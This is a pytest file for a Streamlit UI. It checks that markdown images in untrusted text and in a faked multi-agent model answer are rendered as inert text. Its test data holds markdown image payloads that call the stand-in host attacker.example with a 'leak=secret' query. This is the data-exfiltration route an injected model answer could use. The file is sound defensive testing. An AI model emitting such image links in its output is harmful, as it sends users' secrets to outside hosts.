"""Untrusted text in the legacy Streamlit UI cannot make the browser load anything (AIGSEC-012).

Rendering runs through Streamlit's own test harness (AppTest), so these check what Streamlit is
actually asked to render, offline: the backend is faked as in the other page tests.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

from components.safe_markdown import neutralize

_ROOT = Path(__file__).resolve().parents[1]
EXFILTRATION = "![logo](https://attacker.example/pixel.png?leak=secret)"


def _has_live_image(markdown: str) -> bool:
    return re.search(r"(?<!\\)!\[", markdown.replace("!\\[", "")) is not None


@pytest.mark.parametrize(
    "text",
    [
        EXFILTRATION,
        "before ![x][ref] after\n\n[ref]: https://attacker.example/p.png",
        "![ref]",
        "nested ![a ![b](https://attacker.example/1)](https://attacker.example/2)",
    ],
)
def test_every_image_form_is_turned_into_literal_text(text: str) -> None:
    assert not _has_live_image(neutralize(text))


def test_ordinary_formatting_is_kept() -> None:
    text = "**Bold**, `code`, a [link](https://example.com) and a list:\n- one\n- two!"

    assert neutralize(text) == text


def test_an_exclamation_mark_not_followed_by_a_bracket_is_untouched() -> None:
    assert neutralize("Done! Really!") == "Done! Really!"


def test_a_model_answer_with_an_image_is_rendered_as_text(monkeypatch: pytest.MonkeyPatch) -> None:
    from services.api import copilot

    def fake_run(message: str) -> copilot.MultiAgentRunResult:
        return copilot.MultiAgentRunResult(
            workflow_id="w",
            correlation_id="c",
            status="completed",
            answer=f"Here is the summary. {EXFILTRATION}",
            agents_used=[],
            sources=[],
            duration_ms=1.0,
        )

    monkeypatch.setattr("services.api.copilot.run_multi_agent_workflow", fake_run)
    at = AppTest.from_file(str(_ROOT / "app.py"))
    at.run()
    at.chat_input[0].set_value("Summarise").run()

    rendered = [m.value for m in at.markdown]
    answer = next(value for value in rendered if "Here is the summary." in value)
    assert not _has_live_image(answer)
    assert "attacker.example" in answer  # still visible, as text


def test_raw_html_is_never_enabled_anywhere_in_the_ui() -> None:
    for path in _ROOT.rglob("*.py"):
        if "tests" in path.parts:
            continue
        assert not re.search(r"unsafe_allow_html\s*=", path.read_text(encoding="utf-8")), path.name


def test_the_main_page_says_it_is_a_legacy_ui_without_sign_in() -> None:
    at = AppTest.from_file(str(_ROOT / "app.py"))
    at.run()

    captions = " ".join(c.value for c in at.caption)
    assert "without sign-in" in captions
    assert "React app" in captions
